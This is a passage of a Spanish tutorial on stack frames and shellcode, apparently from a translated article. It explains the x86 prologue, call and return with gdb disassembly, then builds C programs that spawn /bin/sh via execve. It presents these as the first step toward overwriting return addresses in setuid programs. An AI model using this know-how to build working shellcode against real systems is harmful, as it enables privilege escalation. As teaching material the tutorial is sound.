<ol>
<li>
el pr&oacute;logo (<i>prolog)</i> : al iniciar una funci&oacute;n, ya se
prepar&oacute; el escenario, guardando el estado de la pila antes de iniciar
la funci&oacute;n y reservando la memoria necesaria para ejecutarla;</li>

<li>
el llamado a la funci&oacute;n (<i>call)</i> : cuando se llama a una funci&oacute;n,
sus par&aacute;metros se colocan en la pila y se guarda el apuntador de
instrucci&oacute;n (IP) para permitir que la ejecuci&oacute;n de la instrucci&oacute;n
contin&uacute;e a partir del lugar correcto cuando haya concluido la ejecuci&oacute;n
de la funci&oacute;n;</li>

<li>
el regreso de la funci&oacute;n (<i>return)</i> : dejar las cosas como
estaban antes de llamar a la funci&oacute;n.</li>
</ol>

<A NAME="183lfindex9">&nbsp;</A>
<H2>
El pr&oacute;logo</H2>

Una funci&oacute;n siempre empieza con las instrucciones :
<blockquote>
<pre>push&nbsp;&nbsp; %ebp
mov&nbsp;&nbsp;&nbsp; %esp,%ebp
push&nbsp;&nbsp; $0xc,%esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //$0xc depends on each program</pre>
</blockquote>
Estas tres instrucciones constituyen lo que se conoce como el pr&oacute;logo
(<i>prolog)</i>. El&nbsp; <a href="#prolog">diagrama 1</a> detalla la manera
en que trabaja la funci&oacute;n de prolog <tt>toto()</tt> explicando las
partes de los registros <tt>%ebp</tt> and <tt>%esp</tt>&nbsp; :
<br>&nbsp;
<center><table WIDTH="90%" summary="images of stack with explanations" >
<tr>
<td><img SRC="p1.png" ALT="prolog" height=320 width=446></td>

<td>Inicialmente, <tt>%ebp</tt> apunta en la memoria a cualquier direcci&oacute;n
X.
<tt>%esp</tt> est&aacute; mas abajo en la pila, en la direcci&oacute;n
Y y apunta a la &uacute;ltima entrada de la pila. Al iniciar una funci&oacute;n,
se debe salvar el "ambiente actual", es decir <tt>%ebp</tt>. Dado que se
coloca <tt>%ebp</tt> dentro de la pila, <tt>%esp</tt> se decrementa por
una palabra de memoria.</td>
</tr>

<tr>
<td><img SRC="p2.png" ALT="environment" height=320 width=446></td>

<td>Esta segunda instrucci&oacute;n permite construir un nuevo "ambiente",
colocando a&nbsp; <tt>%ebp</tt> en la cima de la pila. Entonces <tt>%ebp</tt>
y <tt>%esp</tt> apuntan a la misma palabra de memoria que contiene la direcci&oacute;n
del ambiente previo.</td>
</tr>

<tr>
<td><img SRC="p3.png" ALT="stack space for local variables" height=320 width=446></td>

<td>Ahora tiene que reservarse el espacio de pila para las variables locales.
El arreglo de caracteres es definido con 5 elementos y necesita&nbsp; 5
bytes (un
<tt>char</tt> es un byte). Sin embargo la pila solo maneja <i>words</i>,
y solo puede reservar m&uacute;ltiplos de un <i>word</i> (1
<i>word</i>,
2 <i>words</i>, 3 <i>words</i>, ...). Para almacenar 5 bytes en el caso
de un <i>word </i>de 4 bytes, se deben usar 8 bytes (es decir 2 <i>words</i>).
La parte en gris podr&iacute;a usarse, a&uacute;n cuando realmente no es
parte de la cadena. El entero <tt>k</tt> usa 4 bytes. Este espacio es reservado
decrementando 0xc (12 in hexadecimal) al valor de&nbsp; <tt>%esp</tt> .
Las variables locales usan&nbsp; 8+4=12 bytes (i.e. 3 words).</td>
</tr>

<caption align="BOTTOM"><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a NAME="prolog" href="#prolog"></a><a href="#prolog" name="prolog">Diag.
1</a> : pr&oacute;logo de una funci&oacute;n</caption>
</table></center>

<p>Adem&aacute;s del mecanismo mismo, lo importante a recordar aqu&iacute;
es la posici&oacute;n de las variables locales :<font color="#FF0000">
las variables locales tienen un offset <b>negativo</b> en relaci&oacute;n
con
<tt>%ebp</tt>.</font> La instrucci&oacute;n
<tt>i=0</tt> en la funci&oacute;n
<tt>main()</tt>
ilustra esto. El c&oacute;digo de ensamblador (cf. debajo) usa direccionamiento
indirecto para accesar a la variable&nbsp; <tt>i</tt> :
<pre><tt>0x8048411 &lt;main+25>:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)</tt>

</pre>
El hexadecimal <tt>0xfffffffc</tt> representa el entero <tt>-4</tt>. La
notaci&oacute;n indica colocar el valor <tt>0</tt> en la variable que se
encuentra a "-4 bytes" en relaci&oacute;n con el registro <tt>%ebp</tt>.
<tt>i</tt>
es la primera y &uacute;nica variable en la funci&oacute;n <tt>main()</tt>,
por tanto su direcci&oacute;n est&aacute; 4 bytes (i.e. tama&ntilde;o entero)
"debajo" del registro <tt>%ebp</tt>.
<br>&nbsp;
<A NAME="183lfindex10">&nbsp;</A>
<H2>
La llamada</H2>

De igual forma que el pr&oacute;logo de una funci&oacute;n prepara su ambiente,
la llamada a una funci&oacute;n le permite a esta funci&oacute;n recibir
sus argumentos, y una vez concluida, regresar a la funci&oacute;n que la
llam&oacute;.
<p>Como ejemplo, tomemos la llamada a <tt>toto(1, 2)</tt>.
<br>&nbsp;
<center><table WIDTH="90%" summary="images and text" >
<tr>
<td><img SRC="a1.png" ALT="argument on stack" height=320 width=446></td>

<td>Antes de llamar a una funci&oacute;n, se almacenan en la pila los argumentos
que necesita. En nuesro ejemplo, los dos enteros constante 1 y 2 se almacenan
en la pila primero, comenzando con el &uacute;ltimo. El registro <tt>%eip</tt>
contiene la direcci&oacute;n de la siguiente instrucci&oacute;n a ejecutar,
en este caso la llamada a la funci&oacute;n.</td>
</tr>

<tr>
<td><img SRC="a2.png" ALT="call" height=320 width=446></td>

<td>Al ejecutar la instrucci&oacute;n <tt>call</tt>, <tt>%eip</tt> toma
el valor de la direcci&oacute;n de la siguiente instrucci&oacute;n que
se encuentra 5 bytes despu&eacute;s (<tt>call</tt> es una instrucci&oacute;n
de 5 byte - cada instrucci&oacute;n no usa el mismo espacio, dependiendo
del CPU). Entonces
<tt>call</tt> guarda la direcci&oacute;n contenida en
<tt>%eip</tt>
para poder regresar a la ejecuci&oacute;n despu&eacute;s de correr la funci&oacute;n.
Este "respaldo" se hace con una instrucci&oacute;n impl&iacute;cita que
guarda el registro en la pila :
<pre>&nbsp;&nbsp;&nbsp; push %eip
&nbsp;&nbsp;&nbsp;</pre>
El valor dado a <tt>call</tt> como un argumento corresponde a a direcci&oacute;n
de la primera instrucci&oacute;n del pr&oacute;logo de la funci&oacute;n
<tt>toto()</tt>.
Entonces esta direcci&oacute;n es copiada a <tt>%eip</tt>, as&iacute; se
convierte en la siguiente instrucci&oacute;n a ejecutar.</td>
</tr>

<caption align="BOTTOM"><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a NAME="call" href="#call"></a><a href="#call" name="call">Diag.
2</a> : Llamada a funci&oacute;n</caption>
</table></center>

<p>Una vez que estamos en el cuerpo de la funci&oacute;n, <font color="#FF0000">sus
argumentos y la direcci&oacute;n de regreso tienen un offset <b>positivo</b>
en relaci&oacute;n a
<tt>%ebp</tt></font>, ya que la siguiente instrucci&oacute;n
coloca a este registro en la cima de la pila. La instrucci&oacute;n <tt>j=0</tt>
en la funci&oacute;n <tt>toto()</tt> ilustra esto. El c&oacute;digo Ensamblador
otra vez usa direccionamiento indirecto para accesar a <tt>j</tt> :
<pre><tt>0x80483ed &lt;toto+29>:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%ebp)</tt>

</pre>
El hexadecimal <tt>0xc</tt> representa el entero <tt>+12</tt>. La notaci&oacute;n
indica colocar el valor <tt>0</tt> en la variable que se encuentra "+12
bytes" en relaci&oacute;n al registro <tt>%ebp</tt>. <tt>j</tt> es el segundo
argumento de la funci&oacute;n y se encuentra 12 bytes "arriba" del registro
<tt>%ebp</tt>
(4 para el respaldo del apuntador de instrucci&oacute;n, 4 para el primer
argumento y 4 para el segundo argumento - cf. el primer diagrama en la
secci&oacute;n regreso)
<br>&nbsp;
<A NAME="183lfindex11">&nbsp;</A>
<H2>
El regreso</H2>

La salida de una funci&oacute;n se hace en dos pasos. Primero debe limpiarse
el ambiente creado para la funci&oacute;n (i.e. poniendo
<tt>%ebp</tt>
y <tt>%eip</tt> como estaban antes de la llamada a la funci&oacute;n).
Una vez hecho esto, se debe checar la pila para obtener informaci&oacute;n
relacionada con la funci&oacute;n de la que estamos saliendo.
<p>El primer paso se hace dentro de la funci&oacute;n con las instrucciones
:
<blockquote>
<pre>leave
ret</pre>
</blockquote>
La siguiente se realiza dentro de la funci&oacute;n donde se hizo la llamada
y consiste en limpiar de la pila los argumentos de la funci&oacute;n llamada.
<p>Tomemos el ejemplo anterior de la funci&oacute;n <tt>toto()</tt>.
<br>&nbsp;
<center><table WIDTH="90%" summary="images and text" >
<tr>
<td><img SRC="r1.png" ALT="initial situation" height=320 width=446></td>

<td>Aqu&iacute; describimos la situaci&oacute;n inicial antes de la llamada
y el pr&oacute;logo. Antes de la llamada, , <tt>%ebp</tt> estaba en la
direcci&oacute;n&nbsp; <tt>X</tt> y <tt>%esp</tt> en la direcci&oacute;n
<tt>Y</tt>
. >A partir de ah&iacute; colocamos en la pila los argumentos de la funci&oacute;n,
guradammos <tt>%eip</tt> y <tt>%ebp</tt> y reservamos algo de espacio para
nuestras variables locales. La siguiente instrucci&oacute;n ejecutada ser&aacute;
<tt>leave</tt>.</td>
</tr>

<tr>
<td><img SRC="r2.png" ALT="leave" height=320 width=446></td>

<td>La instrucci&oacute;n <tt>leave</tt> es equivalente a la secuencia
:&nbsp;
<blockquote>
<pre>&nbsp;&nbsp;&nbsp; mov ebp esp
&nbsp;&nbsp;&nbsp; pop ebp
&nbsp;&nbsp;&nbsp;</pre>
</blockquote>
La primera regresa a&nbsp; <tt>%esp</tt> y <tt>%ebp</tt> al mismo lugar
en la pila. La segunda coloca la cima de la pila en el registro <tt>%ebp</tt>.
Con solamente una instrucci&oacute;n&nbsp; (<tt>leave</tt>), la pila est&aacute;
como habr&iacute;a estado sin el pr&oacute;logo.</td>
</tr>

<tr>
<td><img SRC="r3.png" ALT="restore" height=320 width=446></td>

<td>La instrucci&oacute;n <tt>ret</tt> restaura <tt>%eip</tt> de tal manera
que la ejecuci&oacute;n de la funci&oacute;n que hizo la llamada, inicia
de nuevo donde deber&iacute;a, es decir despu&eacute;s de la funci&oacute;n
que estamos terminando. Por esto, es suficiente con tomar el contenido
de la cima de la pila y colocarlo en&nbsp; <tt>%eip</tt>.&nbsp;
<p>A&uacute;n no estamos en la situaci&oacute;n inicial ya que los argumentos
de la funci&oacute;n todav&iacute;a estan en la pila. La siguiente instrucci&oacute;n
ser&aacute; quitarlos, representada con su direcci&oacute;n <tt>Z+5</tt>
en <tt>%eip</tt> (notemos que el direccionamiento de instrucci&oacute;n
se incrementa, al contrario de lo que sucede con la pila).</td>
</tr>

<tr>
<td><img SRC="r4.png" ALT="stacking of parameters" height=320 width=446></td>

<td>La colocaci&oacute;n de par&aacute;metros en la pila se hace en la
funci&oacute;n que hace la llamada, lo mismo sucede con la remoci&oacute;n
de ellos de la pila. Esto se ilustra en el diagrama opuesto con el separador
entre las instrucciones en la funci&oacute;n llamaday el <tt>add 0x8, %esp</tt>
en la funci&oacute;n que la llama. Esta instrucci&oacute;n regresa a la
cima de la pila tantos bytes como par&aacute;metros usados por la funci&oacute;n
<tt>toto()</tt>.
Los registros <tt>%ebp</tt> y <tt>%esp</tt> estan ahora en la situaci&oacute;n
que estaban antes de la llamada. Por otro lado, el regsitro de instrucci&oacute;n
<tt>%eip</tt>
se movi&oacute; hacia arriba.</td>
</tr>

<caption align="BOTTOM"><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a NAME="return" href="#return"></a><a href="#return" name="return">Diag.
3</a> : Regreso de la funci&oacute;n</caption>
</table></center>

<A NAME="183lfindex12">&nbsp;</A>
<H2>
Desensamblado</H2>

gdb permite obtener el c&oacute;digo Ensamblador correspondiente a las
funciones main() y toto() :
<blockquote>
<pre>>>gcc -g -o fct fct.c
>>gdb fct
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.&nbsp; GDB is free
software, covered by the GNU General Public License, and
you are welcome to change it and/or distribute copies of
it under certain conditions.&nbsp; Type "show copying" to see
the conditions.&nbsp; There is absolutely no warranty for GDB.
Type "show warranty" for details.&nbsp; This GDB was configured
as "i386-redhat-linux"...
(gdb) disassemble main&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>//main
</b>Dump of assembler code for function main:

<font color="#008F00">0x80483f8 &lt;main>:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebp <b>//prolog
</b>0x80483f9 &lt;main+1>:&nbsp; mov&nbsp;&nbsp;&nbsp; %esp,%ebp
0x80483fb &lt;main+3>:&nbsp; sub&nbsp;&nbsp;&nbsp; $0x4,%esp

</font>0x80483fe &lt;main+6>:&nbsp; movl&nbsp;&nbsp; $0x1,0xfffffffc(%ebp)

<font color="#1122FF">0x8048405 &lt;main+13>: push&nbsp;&nbsp; $0x2 <b>//call
</b>0x8048407 &lt;main+15>: push&nbsp;&nbsp; $0x1
0x8048409 &lt;main+17>: call&nbsp;&nbsp; 0x80483d0 &lt;toto>


</font><font color="#A13F00">0x804840e &lt;main+22>: add&nbsp;&nbsp;&nbsp; $0x8,%esp <b>//return from toto()

</b></font>0x8048411 &lt;main+25>: movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)
0x8048418 &lt;main+32>: mov&nbsp;&nbsp;&nbsp; 0xfffffffc(%ebp),%eax

<font color="#1122FF">0x804841b &lt;main+35>: push&nbsp;&nbsp; %eax&nbsp;&nbsp;&nbsp;&nbsp; <b>//call
</b>0x804841c &lt;main+36>: push&nbsp;&nbsp; $0x8048486
0x8048421 &lt;main+41>: call&nbsp;&nbsp; 0x8048308 &lt;printf>


</font><font color="#A13F00">0x8048426 &lt;main+46>: add&nbsp;&nbsp;&nbsp; $0x8,%esp <b>//return from&nbsp;
printf()
</b>0x8048429 &lt;main+49>: leave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>//return from main()
</b>0x804842a &lt;main+50>: ret&nbsp;&nbsp;&nbsp;&nbsp;

</font>End of assembler dump.
(gdb) disassemble toto&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>//toto
</b>Dump of assembler code for function toto:

<font color="#008F00">0x80483d0 &lt;toto>:&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebp&nbsp;&nbsp; <b>//prolog
</b>0x80483d1 &lt;toto+1>:&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %esp,%ebp
0x80483d3 &lt;toto+3>:&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp; $0xc,%esp

</font>0x80483d6 &lt;toto+6>:&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; 0x8048480,%eax
0x80483db &lt;toto+11>:&nbsp; mov&nbsp;&nbsp;&nbsp; %eax,0xfffffff8(%ebp)
0x80483de &lt;toto+14>:&nbsp; mov&nbsp;&nbsp;&nbsp; 0x8048484,%al
0x80483e3 &lt;toto+19>:&nbsp; mov&nbsp;&nbsp;&nbsp; %al,0xfffffffc(%ebp)
0x80483e6 &lt;toto+22>:&nbsp; movl&nbsp;&nbsp; $0x3,0xfffffff4(%ebp)
0x80483ed &lt;toto+29>:&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%ebp)
0x80483f4 &lt;toto+36>:&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x80483f6 &lt;toto+38>

<font color="#A13F00">0x80483f6 &lt;toto+38>:&nbsp; leave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>//return from toto()
</b>0x80483f7 &lt;toto+39>:&nbsp; ret

</font>End of assembler dump.</pre>
</blockquote>
Las instrucciones sin color corresponden a las instrucciones de nuestro
programa, como asignaciones para instancias.
<A NAME="183lfindex13">&nbsp;</A>
<H2>
Creando un c&oacute;digo shell</H2>

En algunos casos es posible actuar sobre el contenido de la pila de proceso,
sobreescribiendo la direcci&oacute;n de regreso de una fucni&oacute;n y
haciendo que la aplicaci&oacute;n ejecute alg&uacute;n c&oacute;digo arbitrario.
Es especialmente interesante para un cracker si la aplicaci&oacute;n se
ejecuta bajo una ID diferente de la del usuario (Colocando programa o demonio-UID).
Este tipo de error es particularmente peligroso si una aplicaci&oacute;n
como un lector de documentos es arrancado por alg&uacute;n otro usuario.
El famoso error del Acrobat Reader, donde un documento modificado era capaz
de generar un sobreflujo del buffer. Tambi&eacute;n ocurre en servicios
de red (ie : imap).
<p>En art&iacute;culos posteriores hablaremos de mecanismos usados para
la ejecuci&oacute;n de instrucciones. Aqu&iacute; iniciamos estudiando
el c&oacute;digo mismo, el que queremos ejecutar desde la aplicaci&oacute;n
principal. La soluci&oacute;n mas simple es con un pedazo de c&oacute;digo
que corra un shell. Entonces el lector puede realizar otras acciones como
cambiar los permisos del archivo <tt>/etc/passwd</tt>. Por razones que
mas adelante resultar&aacute;n obvias, este programa debe hacerse en lenguaje
Ensamblador. Este tipo de programa peque&ntilde;o que se usa para ejecutar
un shell se conoce como c&oacute;digo shell o <i>shellcode</i>.
<p>Los ejemplos mencionados estan inspirados en el articulo de Aleph One'
"<i>Smashing the Stack for Fun and Profit</i>" del n&uacute;mero 49 de
la revista Phrack.
<A NAME="183lfindex14">&nbsp;</A>
<H2>
Con lenguaje C</H2>

El prop&oacute;sito de un shellcode es ejecutar un shell. El siguiente
programa C hace esto :
<pre>/* shellcode1.c */

&nbsp;&nbsp;&nbsp; #include &lt;stdio.h>
&nbsp;&nbsp;&nbsp; #include &lt;unistd.h>

int main()
{
&nbsp; char * name[] = {"/bin/sh", NULL};
&nbsp; execve(name[0], name, NULL);
&nbsp; return (0);
}</pre>
Entre el conjunto de funciones capaces de llamar a un shell, hay muchas
razones que recomiendan el usro de <tt>execve()</tt>. Primero, es una verdadera
llamada a sistema, a diferencia de las otras funciones de la familia <tt>exec()</tt>,
que son en realidad funciones de la biblioteca GlibC construidas a partir
de <tt>execve()</tt>. Una llamada a sistema se hace mediante una interrupci&oacute;n.
Basta con definir los registros y sus contenidos para obtener un peque&ntilde;o
c&oacute;digo Ensamblador efectivo.
<p>A&uacute;n mas, si <tt>execve()</tt> tiene &eacute;xito, el programa
que hace la llamada (en este caso la aplicaci&oacute;n principal) es sustituido
por el c&oacute;digo ejecutable del nuevo programa e inicia su ejecuci&oacute;n.
Cuando la llamada a <tt>execve()falla</tt>, continua la ejecuci&oacute;n
del programa. En nuestro ejemplo, el c&oacute;digo fue insertado en la
mitad de la aplicaci&oacute;n atacada. Continuar con la ejecuci&oacute;n
no tendr&iacute;a sentido e incluso podr&iacute;a ser desastroso. Por tanto,
la ejecuci&oacute;n debe terminar tan pronto como sea posible. Una sentencia
<tt>return
(0)</tt> permite salir de un programa solamente cuando es llamada desde
la funci&oacute;n&nbsp; <tt>main()</tt>, lo cu&aacute;l no ocurre aqu&iacute;.
Entonces debemos forzar la terminaci&oacute;n mediante la funci&oacute;n
<tt>exit()</tt>.
<pre>/* shellcode2.c */

&nbsp;&nbsp;&nbsp; #include &lt;stdio.h>
&nbsp;&nbsp;&nbsp; #include &lt;unistd.h>

int main()
{
&nbsp; char * name [] = {"/bin/sh", NULL};
&nbsp; execve (name [0], name, NULL);
&nbsp; exit (0);
}</pre>
De hecho, <tt>exit()</tt> es otra funci&oacute;n de la biblioteca que envuelve
a la llamada al sistema <tt>_exit()</tt>. Un nuevo cambio nos lleva a&uacute;n
mas cerca del sistema :
<pre>/* shellcode3.c */
&nbsp;&nbsp;&nbsp; #include &lt;unistd.h>
&nbsp;&nbsp;&nbsp; #include &lt;stdio.h>

int main()
{
&nbsp; char * name [] = {"/bin/sh", NULL};
&nbsp; execve (name [0], name, NULL);
&nbsp; _exit(0);
}</pre>
Ahora, es momento de comparar nuestro programa con su equivalente Ensamblador.
<A NAME="183lfindex15">&nbsp;</A>
<H2>
Llamadas de Ensamblador</H2>

Usaremos <tt>gcc</tt> y <tt>gdb</tt> para obtener las instrucciones Ensamblador
correspondientes a nuestro peque&ntilde;o programa. to get the Assembly
instructions corresponding to our small program. Compilaremos <tt>shellcode3.c</tt>
con la opci&oacute;n de depuraci&oacute;n (<tt>-g</tt>) e integraremos
dentro del programa mismo las funciones normalmente encontradas en bibliotecas
compartidas con la opci&oacute;n <tt>--static</tt>. Ahora tenemos la informaci&oacute;n
necesaria para entender la manera en que trabajan las llamadas a sistema
<tt>_exexve()</tt>
y
<tt>_exit()</tt>.
<pre>$ gcc -o shellcode3 shellcode3.c -O2 -g --static</pre>
Luego, con <tt>gdb</tt>, buscamos nuestras funciones equivalentes en Ensamblador.
Esto es para Linux en plataforma Intel (i386 y posteriores).
<pre>$ gdb shellcode3
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public
License, and you are welcome to change it and/or distribute
copies of it under certain conditions.&nbsp; Type "show copying"
to see the conditions.&nbsp; There is absolutely no warranty
for GDB.&nbsp; Type "show warranty" for details.&nbsp; This GDB was
configured as "i386-redhat-linux"...</pre>
Le pedimos a <tt>gdb</tt> que liste el c&oacute;digo Ensamblador, m&aacute;s
particularmente la funci&oacute;n <tt>main()</tt>.
<pre>(gdb) disassemble main
Dump of assembler code for function main:
0x8048168 &lt;main>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebp
0x8048169 &lt;main+1>:&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %esp,%ebp
0x804816b &lt;main+3>:&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp; $0x8,%esp
0x804816e &lt;main+6>:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffff8(%ebp)
0x8048175 &lt;main+13>:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)
0x804817c &lt;main+20>:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x8071ea8,%edx
0x8048181 &lt;main+25>:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %edx,0xfffffff8(%ebp)
0x8048184 &lt;main+28>:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; $0x0
0x8048186 &lt;main+30>:&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; 0xfffffff8(%ebp),%eax
0x8048189 &lt;main+33>:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %eax
0x804818a &lt;main+34>:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edx
<b>0x804818b &lt;main+35>:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x804d9ac &lt;__execve>
</b>0x8048190 &lt;main+40>:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; $0x0
<b>0x8048192 &lt;main+42>:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x804d990 &lt;_exit>
</b>0x8048197 &lt;main+47>:&nbsp;&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;
End of assembler dump.
(gdb)</pre>
Las llamadas a funciones en las direcciones <tt>0x804818b</tt> y
<tt>0x8048192</tt>
invocan a las subrutinas de la biblioteca de C que contienen las llamadas
reales al sistema. Note que la instrucci&oacute;n <tt>0x804817c : mov $0x8071ea8,%edx</tt>
llena el registro <tt>%edx</tt> con un valor que parece una direcci&oacute;n.
Examinemos el contenido de la memoria de esta direcci&oacute;n, despleg&aacute;ndola
como una cadena :
<pre>(gdb) printf "%s\n", 0x8071ea8
/bin/sh
(gdb)</pre>
Ahora sabemos d&oacute;nde est&aacute; la cadena.Ech&eacute;mos un vistazo
a el listado de desensamblado de las funciones <tt>execve()</tt> y <tt>_exit()</tt>
:
<pre>(gdb) disassemble __execve
Dump of assembler code for function __execve:
0x804d9ac &lt;__execve>:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ebp
0x804d9ad &lt;__execve+1>:&nbsp; mov&nbsp;&nbsp;&nbsp; %esp,%ebp
0x804d9af &lt;__execve+3>:&nbsp; push&nbsp;&nbsp; %edi
0x804d9b0 &lt;__execve+4>:&nbsp; push&nbsp;&nbsp; %ebx
0x804d9b1 &lt;__execve+5>:&nbsp; mov&nbsp;&nbsp;&nbsp; 0x8(%ebp),%edi
0x804d9b4 &lt;__execve+8>:&nbsp; mov&nbsp;&nbsp;&nbsp; $0x0,%eax
0x804d9b9 &lt;__execve+13>: test&nbsp;&nbsp; %eax,%eax
0x804d9bb &lt;__execve+15>: je&nbsp;&nbsp;&nbsp;&nbsp; 0x804d9c2 &lt;__execve+22>
0x804d9bd &lt;__execve+17>: call&nbsp;&nbsp; 0x0
0x804d9c2 &lt;__execve+22>: mov&nbsp;&nbsp;&nbsp; 0xc(%ebp),%ecx
0x804d9c5 &lt;__execve+25>: mov&nbsp;&nbsp;&nbsp; 0x10(%ebp),%edx
0x804d9c8 &lt;__execve+28>: push&nbsp;&nbsp; %ebx
0x804d9c9 &lt;__execve+29>: mov&nbsp;&nbsp;&nbsp; %edi,%ebx
0x804d9cb &lt;__execve+31>: mov&nbsp;&nbsp;&nbsp; $0xb,%eax
<b>0x804d9d0 &lt;__execve+36>: int&nbsp;&nbsp;&nbsp; $0x80
</b>0x804d9d2 &lt;__execve+38>: pop&nbsp;&nbsp;&nbsp; %ebx
0x804d9d3 &lt;__execve+39>: mov&nbsp;&nbsp;&nbsp; %eax,%ebx
0x804d9d5 &lt;__execve+41>: cmp&nbsp;&nbsp;&nbsp; $0xfffff000,%ebx
0x804d9db &lt;__execve+47>: jbe&nbsp;&nbsp;&nbsp; 0x804d9eb &lt;__execve+63>
0x804d9dd &lt;__execve+49>: call&nbsp;&nbsp; 0x8048c84&nbsp;
&lt;__errno_location>
0x804d9e2 &lt;__execve+54>: neg&nbsp;&nbsp;&nbsp; %ebx
0x804d9e4 &lt;__execve+56>: mov&nbsp;&nbsp;&nbsp; %ebx,(%eax)
0x804d9e6 &lt;__execve+58>: mov&nbsp;&nbsp;&nbsp; $0xffffffff,%ebx
0x804d9eb &lt;__execve+63>: mov&nbsp;&nbsp;&nbsp; %ebx,%eax
0x804d9ed &lt;__execve+65>: lea&nbsp;&nbsp;&nbsp; 0xfffffff8(%ebp),%esp
0x804d9f0 &lt;__execve+68>: pop&nbsp;&nbsp;&nbsp; %ebx
0x804d9f1 &lt;__execve+69>: pop&nbsp;&nbsp;&nbsp; %edi
0x804d9f2 &lt;__execve+70>: leave&nbsp;&nbsp;
0x804d9f3 &lt;__execve+71>: ret&nbsp;&nbsp;&nbsp;&nbsp;
End of assembler dump.
(gdb) disassemble _exit&nbsp;&nbsp;&nbsp;
Dump of assembler code for function _exit:
0x804d990 &lt;_exit>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %ebx,%edx
0x804d992 &lt;_exit+2>:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; 0x4(%esp,1),%ebx
0x804d996 &lt;_exit+6>:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x1,%eax
<b>0x804d99b &lt;_exit+11>:&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80
</b>0x804d99d &lt;_exit+13>:&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %edx,%ebx
0x804d99f &lt;_exit+15>:&nbsp;&nbsp; cmp&nbsp;&nbsp;&nbsp; $0xfffff001,%eax
0x804d9a4 &lt;_exit+20>:&nbsp;&nbsp; jae&nbsp;&nbsp;&nbsp; 0x804dd90 &lt;__syscall_error>
End of assembler dump.
(gdb) quit</pre>
La llamada real al kernel se hace mediante la interrupci&oacute;n <tt>0x80</tt>,
en la direcci&oacute;n <tt>0x804d9d0</tt> para
<tt>execve()</tt> y en
<tt>0x804d99b</tt>
para
<tt>_exit()</tt>. Este punto es com&uacute;n para varias llamadas
